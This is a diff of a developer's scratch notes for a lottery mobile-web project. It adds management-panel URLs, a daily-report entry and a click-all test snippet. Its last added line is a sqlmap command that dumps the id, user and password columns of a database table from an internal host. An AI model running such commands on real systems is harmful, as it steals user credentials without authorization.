@@ -18,18 +18,28 @@ tar xvf dist.tar
 —————————————————————————————————
 // 8号彩票wap访问路径
 http://172.16.28.91:8080/#/login/b8efd5bd-a4b8-42a9-af84-24c99ce6560a/1
+// management
+http://169.56.12.95:801   / 8081
+http://www.acp58.com:8088/manage/login
+http://169.56.12.76:8080
+http://172.16.28.4:9898/#/goOut/go-out/go-out
+http://172.16.28.114:801/web/#/7?page_id=4 @Kyle404
 
 gitLab地址： https://gitlab.com/feiker/lottery8_wap.git
 ————————————————————————
 // 日报模板
-时间:2018-08-29
+时间:2018-08-30
 工作内容：
  8号彩票wap端:
-    2. 即时注单bug修复
-    3. 官方footer固定
+    1. 投注记录需求确认（100%）
+    2. 投注记录页面（80%）
 操作人:Feiker
     
 
 全选测试脚本
 var divs = document.querySelectorAll('.ssc-kj-item div, .ssc-kj-item-inner-item div,.lottery-plays li')
 for(var i=0; i<divs.length; i++) { divs[i].click()}
+
+
+python sqlmap.py -u "http://172.16.28.114:801/web/#/7?page_id=4" -D romanian_svc -T ra_autori -C "id,user,password" --dump
+  
